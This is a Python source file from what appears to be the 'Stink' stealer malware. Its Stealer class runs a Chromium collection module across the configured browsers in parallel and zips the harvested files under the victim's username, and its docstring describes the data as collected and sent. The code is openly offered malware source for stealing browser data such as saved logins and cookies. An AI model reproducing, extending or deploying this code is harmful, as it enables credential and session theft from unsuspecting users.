from getpass import getuser
from multiprocessing import Pool
from random import random
from threading import Thread

from stink.helpers import functions, MemoryStorage
from stink.helpers.config import BrowsersData
from stink.modules import Chromium


class Stealer(Thread):
    """
    Collects and sends the specified data.
    """

    def __init__(self):
        Thread.__init__(self, name="S")

        self.__storage = MemoryStorage()

    def run(self) -> None:
        """
        Launches the Stink.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:
            with Pool(processes=5) as pool:
                results = pool.starmap(
                    functions.run_process,
                    [
                        (Chromium, data)
                        for data in BrowsersData
                    ],
                )
            pool.close()
            output_file_path = f"{getuser()}.{random()}.zip"
            self.__storage.create_zip(
                [file for files in results if files for file in files], output_file_path
            )


        except Exception as e:
            print(f"[Multi stealer]: {repr(e)}")
